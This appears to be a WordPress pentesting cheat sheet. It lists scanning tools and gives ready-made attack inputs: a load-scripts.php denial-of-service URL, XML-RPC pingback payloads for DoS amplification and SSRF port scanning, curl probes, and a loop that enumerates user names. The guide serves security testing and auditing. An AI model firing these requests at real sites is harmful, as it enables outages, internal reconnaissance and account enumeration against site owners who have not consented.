+++
title = "Wordpress Security"
date = '2022-11-20'
description = 'Common misconfigurations, risky default settings, major mistakes, and general methodologies that are useful when pentesting/bug hunting/auditing wordpress websites.'
+++

## Wordpress Tools:
 - [https://github.com/wpscanteam/wpscan](WPScan) - One of the better tools at it's just.
 -- gem install wpscan
 -- docker pull wpscanteam/wpscan
 -- wpscan --update # updates the database
 -- Users of pentesting distrobutions generally should install the version from their repository.
 - [https://github.com/nullfil3/xmlrpc-scan](https://github.com/nullfil3/xmlrpc-scan)
 - [https://github.com/relarizky/wpxploit](https://github.com/relarizky/wpxploit)

## Wordpress Tricks:

### load-scripts.php denial of service
`load-scripts.php` resource exhaustion
**Wordpress versions 4.9.3** and prior:
```
/wp-admin/load-scripts.php?load=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter
```

### Check IP behind Cloudflare
[https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip/](https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip/)
Get the IP address of a target wordpress website by abusing the ping-back feature

## Testing xml-rpc on all Wordpress versions
[https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/](https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/)

### pingback.xml (can be used for DoS and potential to zombie into a DDoS)
```
<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
 <param>
  <value>
   <string>http://10.0.0.1/hello/world</string>
  </value>
 </param>
 <param>
  <value>
   <string>https://10.0.0.1/hello/world/</string>
  </value>
 </param>
</params>
</methodCall>
```

### WordPress xml-rpc.php SSRF (internal/local port scan)
Easy example would be to check a port that needs to be open or is generally open internally

```
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<TARGET-TO-SCAN>:<PORT-TO-CHECK></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```

### Lsist available methods through xml-rpc
```
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

`curl -X POST -d @pingback.xml https://exmaple.com/xmlrpc.php`

### Check for presence of xmlrpc
`curl -d '<?xml version="1.0" encoding="iso-8859-1"?><methodCall><methodName>demo.sayHello</methodName><params/></methodCall>' -k https://example.com/xmlrpc.php`

### xml-rpc.php tool
 - [https://github.com/nullfil3/xmlrpc-scan](https://github.com/nullfil3/xmlrpc-scan)


### Enumerate users
```
for i in {1..50}; do curl -s -L -i https://example.com/wordpress?author=$i | grep -E -o "Location:.*" | awk -F/ '{print $NF}'; done
```
[https://site.com/wp-json/wp/v2/users/](https://site.com/wp-json/wp/v2/users/)


### Common Misconfigurations:
- Often admins will forget to disable directory listing even for sensitive directories (plugins/themes/etc.. worth checking, I always try /wp-content/uploads/ hoping for directory listing)
- wp-cron.php denial of service: If they're running any kind of older WP then wp-cron runs every time a web page is loaded. For sites make use of several plugins or poorly coded plugins or even just things that take a while to complete (rebuilding cache?), a flood of requests can cause the wp-cron.php method to take the site down..
